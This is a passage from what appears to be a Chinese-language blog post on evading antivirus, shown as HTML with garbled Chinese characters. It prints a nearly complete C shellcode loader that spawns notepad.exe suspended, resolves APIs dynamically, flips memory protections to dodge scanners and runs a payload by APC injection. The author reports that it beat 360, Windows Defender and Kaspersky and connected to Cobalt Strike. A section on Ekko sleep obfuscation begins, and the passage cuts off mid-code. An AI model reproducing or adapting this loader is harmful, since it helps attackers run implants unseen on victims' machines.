class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;pragma&lt;/span&gt; comment(linker,&lt;span class=&#34;string&#34;&gt;&amp;quot;/subsystem:\&amp;quot;Windows\&amp;quot; /entry:\&amp;quot;mainCRTStartup\&amp;quot;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; fish[&lt;span class=&#34;number&#34;&gt;307910&lt;/span&gt;] = &amp;#123;......&amp;#125;   &lt;span class=&#34;comment&#34;&gt;//sgnåçš„shellcode&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;* text_path = &lt;span class=&#34;string&#34;&gt;&amp;quot;C:\\Windows\\System32\\notepad.exe&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;* CreateP = &lt;span class=&#34;string&#34;&gt;&amp;quot;CreateProcessA&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;* VirPro = &lt;span class=&#34;string&#34;&gt;&amp;quot;VirtualProtect&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;* VirAloc = &lt;span class=&#34;string&#34;&gt;&amp;quot;VirtualAllocEx&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;* WriteMem = &lt;span class=&#34;string&#34;&gt;&amp;quot;WriteProcessMemory&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;* QueAPC = &lt;span class=&#34;string&#34;&gt;&amp;quot;QueueUserAPC&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;typedef&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;BOOL&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(WINAPI* pCreateProcessA)&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	LPCSTR                lpApplicationName,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	LPSTR                 lpCommandLine,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	LPSECURITY_ATTRIBUTES lpProcessAttributes,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	LPSECURITY_ATTRIBUTES lpThreadAttributes,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	BOOL                  bInheritHandles,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	DWORD                 dwCreationFlags,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	LPVOID                lpEnvironment,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	LPCSTR                lpCurrentDirectory,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	LPSTARTUPINFOA        lpStartupInfo,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	LPPROCESS_INFORMATION lpProcessInformation&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;typedef&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;LPVOID&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(WINAPI* pVirtualAllocEx)&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	HANDLE hProcess,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	LPVOID lpAddress,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	SIZE_T dwSize,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	DWORD  flAllocationType,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	DWORD  flProtect&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;typedef&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;BOOL&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(WINAPI* pVirtualProtect)&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	LPVOID lpAddress,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	SIZE_T dwSize,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	DWORD  flNewProtect,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	PDWORD lpflOldProtect&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;typedef&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;BOOL&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(WINAPI* pWriteProcessMemory)&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	HANDLE  hProcess,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	LPVOID  lpBaseAddress,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	LPCVOID lpBuffer,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	SIZE_T  nSize,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	SIZE_T* lpNumberOfBytesWritten&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;typedef&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;DWORD&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(WINAPI* pQueueUserAPC)&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	PAPCFUNC  pfnAPC,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	HANDLE    hThread,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	ULONG_PTR dwData&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;GoHere&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	STARTUPINFO si = &amp;#123; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	PROCESS_INFORMATION pi = &amp;#123; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	si.cb = &lt;span class=&#34;built_in&#34;&gt;sizeof&lt;/span&gt;(STARTUPINFO);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	HMODULE hKernel32 = &lt;span class=&#34;built_in&#34;&gt;GetModuleHandleW&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;L&amp;quot;kernel32.dll&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	pCreateProcessA MyCreateProcess = (pCreateProcessA)&lt;span class=&#34;built_in&#34;&gt;GetProcAddress&lt;/span&gt;(hKernel32, CreateP);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	pVirtualAllocEx MyVirtualAlloc = (pVirtualAllocEx)&lt;span class=&#34;built_in&#34;&gt;GetProcAddress&lt;/span&gt;(hKernel32, VirAloc);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	pVirtualProtect MyVirProtect = (pVirtualProtect)&lt;span class=&#34;built_in&#34;&gt;GetProcAddress&lt;/span&gt;(hKernel32, VirPro);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	pWriteProcessMemory MyWriteMen = (pWriteProcessMemory)&lt;span class=&#34;built_in&#34;&gt;GetProcAddress&lt;/span&gt;(hKernel32, WriteMem);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	pQueueUserAPC MyQueueAPC = (pQueueUserAPC)&lt;span class=&#34;built_in&#34;&gt;GetProcAddress&lt;/span&gt;(hKernel32, QueAPC);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;MyCreateProcess&lt;/span&gt;(text_path, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, (LPSTARTUPINFOA)&amp;amp;si, &amp;amp;pi);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	LPVOID lpBaseeAddresss = (LPVOID)&lt;span class=&#34;built_in&#34;&gt;MyVirtualAlloc&lt;/span&gt;(pi.hProcess, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0X400200&lt;/span&gt;, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	DWORD oldProtect;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;MyVirProtect&lt;/span&gt;(lpBaseeAddresss, &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt; fish, PAGE_NOACCESS, &amp;amp;oldProtect);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;number&#34;&gt;986&lt;/span&gt;; i++);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;MyVirProtect&lt;/span&gt;(lpBaseeAddresss, &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt; fish, PAGE_READWRITE, &amp;amp;oldProtect);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;number&#34;&gt;777&lt;/span&gt;; i++);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;MyVirProtect&lt;/span&gt;(lpBaseeAddresss, &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt; fish, PAGE_NOACCESS, &amp;amp;oldProtect);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;number&#34;&gt;321&lt;/span&gt;; i++);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;MyVirProtect&lt;/span&gt;(lpBaseeAddresss, &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt; fish, PAGE_READWRITE, &amp;amp;oldProtect);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;number&#34;&gt;123&lt;/span&gt;; i++);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;MyVirProtect&lt;/span&gt;(lpBaseeAddresss, &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt; fish, PAGE_NOACCESS, &amp;amp;oldProtect);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;number&#34;&gt;256&lt;/span&gt;; i++);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;MyVirProtect&lt;/span&gt;(lpBaseeAddresss, &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt; fish, PAGE_EXECUTE_READ, &amp;amp;oldProtect);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;Sleep&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;15000&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;MyWriteMen&lt;/span&gt;(pi.hProcess, lpBaseeAddresss, (LPVOID)fish, &lt;span class=&#34;built_in&#34;&gt;sizeof&lt;/span&gt;(fish), &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;MyQueueAPC&lt;/span&gt;((PAPCFUNC)lpBaseeAddresss, pi.hThread, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;ResumeThread&lt;/span&gt;(pi.hThread);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;CloseHandle&lt;/span&gt;(pi.hThread);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//å·¥å…·ç”Ÿæˆçš„junkCodeè¿›è¡Œå¡«å……ï¼Œå¤ªé•¿äº†å°±ä¸å†™äº†&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
 ç¼–è¯‘å®Œåè¿˜å¯ä»¥è¿›ä¸€æ­¥æ“ä½œï¼Œæ¯”å¦‚æ›¿æ¢ ico å›¾æ ‡ï¼Œæ·»åŠ ä¼ªç­¾åç­‰ç­‰ã€‚è¿™é‡Œæˆ‘åªè¿›è¡Œå›¾æ ‡çš„æ›¿æ¢æµ‹è¯•äº† 360 (æ ¸æ™¶æ¨¡å¼)ã€windowDefinder (ä¸ªäººç‰ˆã€ä¼ä¸šç‰ˆã€ä¸“ä¸šç‰ˆ)ã€å¡å·´æ–¯åŸº (å…è´¹ç‰ˆ)ï¼Œå…¶ä¸­é™¤äº† wdf ä¸“ä¸šç‰ˆæ— æ³•ä¸Šçº¿ä¹‹å¤–å…¶ä»–éƒ½èƒ½åšåˆ°æ— æ„Ÿä¸Šçº¿ï¼Œå¹¶ä¸”å¯ä»¥ç›´æ¥æ‰§è¡Œ shell å‘½ä»¤ (å½“ç„¶è¿™é‡Œæˆ‘ç”¨çš„æ˜¯ cs4.9 å¹¶ä¸”é…ç½®äº† C2profile æœ‰ä¸€å®šçš„æµé‡è§„é¿æ•ˆæœ)ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;360 æ ¸æ™¶&lt;/strong&gt;ï¼š&lt;img data-src=&#34;https://dlink.host/wx3.sinaimg.cn/large/008DfUDOly8hrpqnl0tgyj31c00u0gs7.jpg&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
&lt;strong&gt;wdf (çœŸå®ç¯å¢ƒè¿œç¨‹ä¸Šçº¿ ==&amp;gt; æ‰§è¡Œ screenshot)&lt;/strong&gt;ï¼š&lt;img data-src=&#34;https://dlink.host/wx3.sinaimg.cn/large/008DfUDOly8hrpqr5hiihj316c0pi7an.jpg&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
&lt;strong&gt;å¡å·´æ–¯åŸº&lt;/strong&gt;ï¼š&lt;img data-src=&#34;https://dlink.host/wx3.sinaimg.cn/large/008DfUDOly8hrpqnosm7hj31u70u0dqa.jpg&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
&lt;strong&gt;360 æ€æ¯’ + 360 æ ¸æ™¶ä¼šæŠ¥è­¦å‘Šæç¤º&lt;/strong&gt;&lt;/p&gt;
&lt;h5 id=&#34;ekkoç¡çœ æ··æ·†æŠ€æœ¯æ¼”ç¤º&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ekkoç¡çœ æ··æ·†æŠ€æœ¯æ¼”ç¤º&#34;&gt;#&lt;/a&gt; Ekko ç¡çœ æ··æ·†æŠ€æœ¯æ¼”ç¤ºï¼š&lt;/h5&gt;
&lt;p&gt;è¯¥é¡¹ç›®ä¹Ÿæ˜¯ havoC2 çš„ä½œè€…çš„ï¼Œå·²ç»é›†æˆåœ¨äº† havoc ä¸Šï¼Œåœ¨è¿™æˆ‘ä»¬å•ç‹¬æŠŠè¿™ä¸ªé¡¹ç›®è¿è¡Œçœ‹çœ‹ï¼Œå°† github ä¸Šçš„é¡¹ç›®æ‹‰å–åˆ°æœ¬åœ°å³å¯ï¼Œç¼–è¯‘å™¨ç”¨çš„æ˜¯ visual studio2022ã€‚å…¶æ··æ·†åŸç†ç®€å•æ¥è¯´å°±æ˜¯åœ¨ä¸€ä¸ªå‘¨æœŸå†…ç¡çœ ç»“æŸåçš„å‡ åæ¯«ç§’å†…å°†å†…å­˜ä¸­ä»£ç æ®µè¿›è¡Œå¼‚æˆ–æ¢å¤åˆ°æ­£å¸¸åŠŸèƒ½ä»£ç ï¼Œå¹¶åŒæ—¶æ¢å¤ RX å±æ€§ã€‚&lt;br /&gt;
æˆ‘ä»¬éœ€è¦å…³æ³¨çš„ä»£ç æ®µå°±åœ¨ Ekko.c ä¸­ï¼Œè¿™é‡Œæˆ‘ä»¬å•ç‹¬æç‚¼å‡ºæ¥ï¼š&lt;br /&gt;
&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ImageBase = &lt;span class=&#34;built_in&#34;&gt;GetModuleHandleA&lt;/span&gt;(&lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;);     &lt;span class=&#34;comment&#34;&gt;//è·å–å½“å‰è¿›ç¨‹åŸºå€&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//è·å–è¯¥æœ¬è¿›ç¨‹å†…å­˜é•œåƒå¤§å°&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)ImageBase;&lt;/span&gt;&lt;br&gt;&lt;span 